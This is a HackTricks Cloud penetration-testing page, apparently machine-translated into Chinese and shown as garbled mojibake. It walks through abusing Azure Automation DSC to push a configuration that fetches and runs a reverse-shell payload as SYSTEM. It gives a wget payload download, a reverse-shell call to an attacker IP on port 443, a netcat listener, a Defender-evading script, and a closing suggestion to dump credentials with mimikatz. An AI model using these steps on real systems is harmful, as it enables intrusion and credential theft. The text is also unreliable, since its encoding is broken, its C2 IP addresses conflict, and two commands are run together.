# Az - çŠ¶æ€é…ç½®è¿œç¨‹ä»£ç æ‰§è¡Œ

<details>

<summary><strong>æ”¯æŒ HackTricks å¹¶è·å¾—ç¦åˆ©ï¼</strong></summary>

* å¦‚æœæ‚¨æƒ³åœ¨ HackTricks ä¸­çœ‹åˆ°æ‚¨çš„å…¬å¸å¹¿å‘Šï¼Œæˆ–è€…å¦‚æœæ‚¨æƒ³è®¿é—® PEASS çš„æœ€æ–°ç‰ˆæœ¬æˆ–ä¸‹è½½ HackTricks çš„ PDFï¼Œè¯·æŸ¥çœ‹[**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)ï¼
* è·å–[**å®˜æ–¹ PEASS å’Œ HackTricks å•†å“**](https://peass.creator-spring.com)
* å‘ç°[**PEASS å®¶æ—**](https://opensea.io/collection/the-peass-family)ï¼Œæˆ‘ä»¬çš„ç‹¬å®¶[**NFT**](https://opensea.io/collection/the-peass-family)æ”¶è—å“
* **åŠ å…¥** ğŸ’¬ [**Discord ç¾¤ç»„**](https://discord.gg/hRep4RUj7f) æˆ– [**Telegram ç¾¤ç»„**](https://t.me/peass) æˆ– **å…³æ³¨**æˆ‘çš„ **Twitter** ğŸ¦ [**@carlospolopm**](https://twitter.com/carlospolopm)**ã€‚**
* **é€šè¿‡å‘** [**HackTricks**](https://github.com/carlospolop/hacktricks) **å’Œ** [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) **github ä»“åº“æäº¤ PR æ¥åˆ†äº«æ‚¨çš„é»‘å®¢æŠ€å·§ã€‚**

</details>

**æ­¤å¸–å­çš„å†…å®¹æ¥è‡ª** [**https://medium.com/cepheisecurity/abusing-azure-dsc-remote-code-execution-and-privilege-escalation-ab8c35dd04fe**](https://medium.com/cepheisecurity/abusing-azure-dsc-remote-code-execution-and-privilege-escalation-ab8c35dd04fe)

### è¿œç¨‹æœåŠ¡å™¨ï¼ˆC2ï¼‰åŸºç¡€è®¾æ–½å‡†å¤‡ <a href="#f0fa" id="f0fa"></a>

æˆ‘å°†åœ¨è¿œç¨‹æœåŠ¡å™¨â€œ40.84.7.74â€ä¸Šæ‰˜ç®¡ä¸€ä¸ªç²¾ç®€ç‰ˆçš„ Nishang Invoke-PowerShellTcp.ps1 è´Ÿè½½ï¼Œè´Ÿè½½åç§°ä¸ºâ€œRevPS.ps1â€ã€‚ä¸ºäº†é˜²æ­¢ Nishang è„šæœ¬å› ä»»ä½•åŸå› è¢« Windows Defender åˆ é™¤ï¼ˆä¹Ÿè®¸æ‚¨æ›´æ„¿æ„å°†æ–‡ä»¶æ”¾åˆ°ç£ç›˜ä¸Šï¼‰ï¼Œæˆ‘åœ¨è¿™é‡Œæä¾›äº†ä¸€ä¸ªè½»é‡çº§ç‰ˆæœ¬ï¼Œå¯ä»¥ç»•è¿‡ Defenderï¼š[https://github.com/nickpupp0/AzureDSCAbuse/blob/master/RevPS.ps1](https://github.com/nickpupp0/AzureDSCAbuse/blob/master/RevPS.ps1)ã€‚è¿™å°†ç”± Kali ç³»ç»Ÿä¸Šçš„ç®€å• Python æœåŠ¡å™¨æ‰˜ç®¡ã€‚

### æ­¥éª¤ 1 â€” åˆ›å»ºæ–‡ä»¶ <a href="#89de" id="89de"></a>

æˆ‘ä»¬éœ€è¦åˆ›å»ºå¦ä¸€ä¸ª DSC é…ç½®æ–‡ä»¶ã€‚å¯ä»¥åœ¨æ­¤å¤„ä¸‹è½½æ¨¡æ¿ï¼š[https://github.com/nickpupp0/AzureDSCAbuse/blob/master/reverse\_shell\_config.ps1](https://github.com/nickpupp0/AzureDSCAbuse/blob/master/reverse\_shell\_config.ps1)ã€‚æ­¤é…ç½®æ–‡ä»¶å°†ä½¿ç”¨ä¸ä¹‹å‰ç›¸åŒçš„æ–‡ä»¶å†™å…¥å‡½æ•°ã€‚è¿™æ¬¡ï¼Œå†…å®¹åŒ…æ‹¬ä»æˆ‘ä»¬çš„è¿œç¨‹æœåŠ¡å™¨ä¸‹è½½å’Œæ‰§è¡Œè´Ÿè½½çš„ä»£ç ã€‚æ­¤å¤–ï¼Œæˆ‘ä»¬ä½¿ç”¨äº† _ComputerManagementDsc_ æ¨¡å—ä¸­å¯ç”¨çš„è®¡åˆ’ä»»åŠ¡å‡½æ•°ã€‚è®¡åˆ’ä»»åŠ¡å‡½æ•°å°†åœ¨æ‰§è¡Œæ—¶èµ·åˆ°å…³é”®ä½œç”¨ï¼Œå¹¶ä¸ºæˆ‘ä»¬æä¾› SYSTEM æƒé™ã€‚

æˆ‘ä»¬è¿˜å°†ä¸‹è½½ä¸€ä¸ªè„šæœ¬ï¼Œç”¨äºå°†é…ç½®å‘å¸ƒåˆ°è™šæ‹Ÿæœºã€‚è¯¥è„šæœ¬ä½äºæ­¤å¤„ï¼š[https://github.com/nickpupp0/AzureDSCAbuse/blob/master/push\_reverse\_shell\_config.ps1](https://github.com/nickpupp0/AzureDSCAbuse/blob/master/push\_reverse\_shell\_config.ps1)ã€‚

è¿™äº›æ–‡ä»¶å°†ä½œä¸ºæ¨¡æ¿ã€‚**æ‚¨éœ€è¦ä½¿ç”¨æ‚¨æ­£åœ¨ä½¿ç”¨çš„å˜é‡åå’Œå‚æ•°å¡«å†™**ã€‚è¿™åŒ…æ‹¬èµ„æºåç§°ã€æ–‡ä»¶è·¯å¾„å’Œæ‚¨æ­£åœ¨ä½¿ç”¨çš„å¤–éƒ¨æœåŠ¡å™¨/è´Ÿè½½åç§°ã€‚è¯·å‚è€ƒä»£ç ä¸­çš„æ³¨é‡Šã€‚

<figure><img src="../../../../.gitbook/assets/image (3) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

### æ­¥éª¤ 2 â€” å‹ç¼©é…ç½®æ–‡ä»¶ <a href="#c2c2" id="c2c2"></a>

åˆ›å»ºå¥½æˆ‘ä»¬çš„ä¸¤ä¸ªæ–‡ä»¶åï¼Œæˆ‘ä»¬å°†å‹ç¼©**'reverse\_shell\_config.ps1'**æ–‡ä»¶ï¼Œä»¥ä¾¿å°†å…¶å‘é€åˆ°å­˜å‚¨å¸æˆ·ä¸­ã€‚
```
Compress-Archive -Path .\reverse_shell_config.ps1 -DestinationPath .\reverse_shell_config.ps1.zip
```
<figure><img src="../../../../.gitbook/assets/image (38).png" alt=""><figcaption></figcaption></figure>

### æ­¥éª¤ 3 â€” è®¾ç½®å­˜å‚¨ä¸Šä¸‹æ–‡å¹¶ä¸Šä¼  <a href="#bed9" id="bed9"></a>

åŒæ ·ï¼Œæˆ‘ä»¬å°†è®¾ç½®å­˜å‚¨å¸æˆ·çš„ä¸Šä¸‹æ–‡ï¼Œæˆ‘å·²ç»å®Œæˆäº†è¿™ä¸€æ­¥ã€‚æˆ‘å·²ç»æœ‰ä¸€ä¸ªåä¸º '**azure-pentes**t' çš„å®¹å™¨ï¼Œæ‰€ä»¥æˆ‘å°†åœ¨è¿™é‡Œå‘å¸ƒæˆ‘çš„æ–‡ä»¶ï¼š
```
Set-AzStorageBlobContent -File "reverse_shell_config.ps1.zip" -Container "azure-pentest" -Blob "reverse_shell_config.ps1.zip" -Context $ctx
```
<figure><img src="../../../../.gitbook/assets/image (82).png" alt=""><figcaption></figcaption></figure>

### ç¬¬å››æ­¥ â€” å‡†å¤‡ Kali Box <a href="#20fb" id="20fb"></a>

åœ¨æˆ‘ä»¬çš„ Kali Box ä¸­ï¼Œæˆ‘ä»¬å¯ä»¥ç®€å•åœ°ä½¿ç”¨ _wget_ ä¸‹è½½æˆ‘ä»¬çš„ PowerShell è´Ÿè½½ã€‚åŸå§‹çš„åå‘ shell è„šæœ¬ä½äºè¿™é‡Œï¼š[https://raw.githubusercontent.com/nickpupp0/AzureDSCAbuse/master/RevPS.ps1](https://raw.githubusercontent.com/nickpupp0/AzureDSCAbuse/master/RevPS.ps1)ã€‚
```
wget https://raw.githubusercontent.com/nickpupp0/AzureDSCAbuse/master/RevPS.ps1
```
<figure><img src="../../../../.gitbook/assets/image (8) (2).png" alt=""><figcaption></figcaption></figure>

æˆ‘ä»¬éœ€è¦ç¼–è¾‘åå‘Shellè„šæœ¬ï¼Œé€šè¿‡æ·»åŠ æˆ‘ä»¬çš„å‚æ•°ï¼Œè®©Windowsè™šæ‹Ÿæœºåœ¨æ‰§è¡Œæ—¶çŸ¥é“è¦è¿æ¥åˆ°å“ªé‡Œã€‚åœ¨æˆ‘çš„æƒ…å†µä¸‹ï¼Œæˆ‘æ·»åŠ äº†ä»¥ä¸‹å†…å®¹ï¼š
```
RevPShell -Reverse 40.84.7.73 443
```
<figure><img src="../../../../.gitbook/assets/image (2) (3).png" alt=""><figcaption></figcaption></figure>

### ç¬¬5æ­¥ â€” å‘å¸ƒé…ç½®æ–‡ä»¶ <a href="#9ad6" id="9ad6"></a>

ç°åœ¨æˆ‘ä»¬å°†è¿è¡Œæˆ‘ä»¬çš„é…ç½®æ–‡ä»¶ã€‚æˆ‘å·²ç»è®¾ç½®äº†å°†å…¶å‘å¸ƒåˆ°æ¡Œé¢ä»¥è·å¾—æ›´å¥½çš„å¯è§†æ•ˆæœï¼Œä½†å®ƒå¯ä»¥å‘å¸ƒåˆ°ä»»ä½•åœ°æ–¹ã€‚å‡ åˆ†é’Ÿåï¼Œæˆ‘ä»¬å°†çœ‹åˆ°åå‘shellè„šæœ¬å·²ç»è¢«å‘å¸ƒäº†ï¼

<figure><img src="../../../../.gitbook/assets/image (2) (1) (1).png" alt=""><figcaption></figcaption></figure>

### ç¬¬6æ­¥ â€” æ‰˜ç®¡æœ‰æ•ˆè½½è·å¹¶è®¾ç½®ç›‘å¬å™¨ <a href="#c55f" id="c55f"></a>

ä¸€æ—¦æˆ‘ä»¬å‘å¸ƒäº†é…ç½®æ–‡ä»¶ï¼Œæˆ‘ä»¬å¯ä»¥åŒæ—¶å¯åŠ¨ä¸€ä¸ªPython SimpleHTTPServeråœ¨ç«¯å£80ä¸Šæ‰˜ç®¡æœ‰æ•ˆè½½è·ï¼Œä»¥åŠä¸€ä¸ªnetcatç›‘å¬å™¨æ¥æ•è·è¿æ¥ï¼š
```
sudo python -m SimpleHTTPServer 80sudo nc -nlvp 443
```
æˆ‘ä»¬çœ‹åˆ°è®¡åˆ’ä»»åŠ¡å·²ç»è¿è¡Œï¼Œå¹¶ä¸”æˆ‘ä»¬çš„è½½è·å·²ç»ä»¥**SYSTEM**çº§åˆ«æƒé™åœ¨å†…å­˜ä¸­è¢«æ£€ç´¢å’Œæ‰§è¡Œï¼

<figure><img src="../../../../.gitbook/assets/image (1) (3) (1).png" alt=""><figcaption></figcaption></figure>

### æ€»ç»“ <a href="#1ec2" id="1ec2"></a>

è¿™ç°åœ¨ä¸ºè®¸å¤šå¯èƒ½æ€§æ‰“å¼€äº†å¤§é—¨ã€‚ç”±äºæˆ‘ä»¬æœ‰ä¸€ä¸ªä»¥**SYSTEM**èº«ä»½è¿è¡Œçš„shellï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨mimikatzæ¥è½¬å‚¨å‡­æ®ï¼ˆæ ¹æ®äº‘èµ„æºçš„EDRæˆç†Ÿç¨‹åº¦å¯èƒ½å­˜åœ¨é£é™©ï¼‰ã€‚å¦‚æœä½ è½¬å‚¨å‡­æ®ï¼Œå¾ˆæœ‰å¯èƒ½å¯ä»¥åœ¨ä¸åŒèµ„æºä¹‹é—´é‡å¤ä½¿ç”¨å®ƒä»¬ã€‚æœ€åï¼Œä¸€ä¸ªé‡è¦çš„æ”¶è·æ˜¯ï¼Œä½ ç°åœ¨å¯ä»¥å°†æ­¤é…ç½®æ½œåœ¨åœ°åº”ç”¨äºå¤šä¸ªè™šæ‹Ÿæœºï¼Œè€Œä¸ä»…ä»…é™äºä¸€ä¸ªè™šæ‹Ÿæœºã€‚

åœ¨æ­¤ç»“æŸæˆ‘ä»¬çš„Azure Automation DSCå†’é™©ï¼å¸Œæœ›ä½ ç©å¾—å¼€å¿ƒï¼Œå­¦åˆ°äº†å¾ˆå¤šï¼Œå¹¶ç»§ç»­å‘æŒ¥è‡ªå·±çš„åˆ›é€ åŠ›ã€‚

<details>

<summary><strong>æ”¯æŒHackTrickså¹¶è·å¾—ç¦åˆ©ï¼</strong></summary>

* å¦‚æœä½ æƒ³çœ‹åˆ°ä½ çš„**å…¬å¸åœ¨HackTricksä¸­è¢«å¹¿å‘Š**ï¼Œæˆ–è€…å¦‚æœä½ æƒ³è®¿é—®**PEASSçš„æœ€æ–°ç‰ˆæœ¬æˆ–ä¸‹è½½PDFæ ¼å¼çš„HackTricks**ï¼Œè¯·æŸ¥çœ‹[**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)ï¼
* è·å¾—[**å®˜æ–¹PEASSå’ŒHackTrickså‘¨è¾¹äº§å“**](https://peass.creator-spring.com)
* å‘ç°[**PEASSå®¶æ—**](https://opensea.io/collection/the-peass-family)ï¼Œæˆ‘ä»¬çš„ç‹¬å®¶[**NFTs**](https://opensea.io/collection/the-peass-family)æ”¶è—å“
* **åŠ å…¥** ğŸ’¬ [**Discordç¾¤ç»„**](https://discord.gg/hRep4RUj7f) æˆ– [**Telegramç¾¤ç»„**](https://t.me/peass) æˆ– **å…³æ³¨**æˆ‘åœ¨**Twitter**ä¸Šçš„åŠ¨æ€ ğŸ¦ [**@carlospolopm**](https://twitter.com/carlospolopm)**ã€‚**
* **é€šè¿‡å‘** [**HackTricks**](https://github.com/carlospolop/hacktricks) å’Œ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) **githubä»“åº“æäº¤PRæ¥åˆ†äº«ä½ çš„é»‘å®¢æŠ€å·§ã€‚**

</details>
